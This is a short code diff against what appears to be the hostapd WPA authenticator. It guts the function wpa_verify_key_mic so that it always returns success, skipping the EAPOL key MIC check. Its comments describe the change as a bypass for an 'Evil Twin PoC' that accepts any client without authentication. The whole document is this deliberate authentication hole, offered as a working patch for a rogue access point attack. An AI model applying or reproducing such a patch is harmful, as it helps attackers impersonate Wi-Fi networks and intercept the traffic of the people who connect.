@@ -1737,32 +1737,14 @@ static void wpa_send_eapol(struct wpa_authenticator *wpa_auth,
 
 
 static int wpa_verify_key_mic(int akmp, struct wpa_ptk *PTK, u8 *data,
-			      size_t data_len)
+		      size_t data_len)
 {
-	struct ieee802_1x_hdr *hdr;
-	struct wpa_eapol_key *key;
-	struct wpa_eapol_key_192 *key192;
-	u16 key_info;
-	int ret = 0;
-	u8 mic[WPA_EAPOL_KEY_MIC_MAX_LEN];
-	size_t mic_len = wpa_mic_len(akmp);
-
-	if (data_len < sizeof(*hdr) + sizeof(*key))
-		return -1;
-
-	hdr = (struct ieee802_1x_hdr *) data;
-	key = (struct wpa_eapol_key *) (hdr + 1);
-	key192 = (struct wpa_eapol_key_192 *) (hdr + 1);
-	key_info = WPA_GET_BE16(key->key_info);
-	os_memcpy(mic, key192->key_mic, mic_len);
-	os_memset(key192->key_mic, 0, mic_len);
-	if (wpa_eapol_key_mic(PTK->kck, PTK->kck_len, akmp,
-			      key_info & WPA_KEY_INFO_TYPE_MASK,
-			      data, data_len, key192->key_mic) ||
-	    os_memcmp_const(mic, key192->key_mic, mic_len) != 0)
-		ret = -1;
-	os_memcpy(key192->key_mic, mic, mic_len);
-	return ret;
+    // PATCH: BYPASS MIC VERIFICATION
+    // Always return success (0) without checking MIC
+    (void)akmp; (void)PTK; (void)data; (void)data_len;
+    
+    // For Evil Twin PoC - accept any client connections without authentication
+    return 0;
 }
 
 
